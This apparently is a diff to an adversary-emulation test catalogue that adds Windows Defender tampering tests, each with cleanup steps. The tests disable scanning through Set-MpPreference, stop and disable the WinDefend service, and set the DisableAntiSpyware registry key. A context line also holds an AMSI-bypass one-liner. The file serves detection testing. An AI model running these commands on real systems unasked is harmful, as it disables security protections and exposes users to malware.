@@ -234,3 +234,51 @@ atomic_tests:
     elevation_required: false
     command: |
       [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+- name: Tamper with Windows Defender ATP PowerShell
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Set-MpPreference -DisableRealtimeMonitoring 1
+      Set-MpPreference -DisableBehaviorMonitoring 1
+      Set-MpPreference -DisableScriptScanning 1
+      Set-MpPreference -DisableBlockAtFirstSeen 1
+    cleanup_command: |
+      Set-MpPreference -DisableRealtimeMonitoring 0
+      Set-MpPreference -DisableBehaviorMonitoring 0
+      Set-MpPreference -DisableScriptScanning 0
+      Set-MpPreference -DisableBlockAtFirstSeen 0
+
+- name: Tamper with Windows Defender Command Prompt
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp
+  supported_platforms:
+    - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      sc stop WinDefend
+      sc config WinDefend start=disabled
+      sc query WinDefend
+    cleanup_command: |
+      sc start WinDefend
+      sc config WinDefend start=enabled
+
+- name: Tamper with Windows Defender Registry
+  description: |
+    Disable Windows Defender from starting after a reboot
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+    cleanup_command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
